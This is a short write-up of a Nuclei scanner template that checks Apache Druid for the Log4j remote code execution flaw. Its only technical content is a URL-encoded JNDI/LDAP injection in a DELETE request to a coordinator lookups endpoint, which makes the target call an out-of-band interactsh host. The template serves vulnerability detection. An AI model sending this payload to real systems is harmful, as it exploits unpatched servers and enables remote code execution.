# Nuclei Template: Apache Druid - Remote Code Execution (Apache Log4j)
**Template ID:** apache-druid-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`apache-druid-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Apache Druid is vulnerable to RCE due to Log4j.

## Steps to reproduce / Exploit Payload
```http
DELETE {{BaseURL}}/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d
```

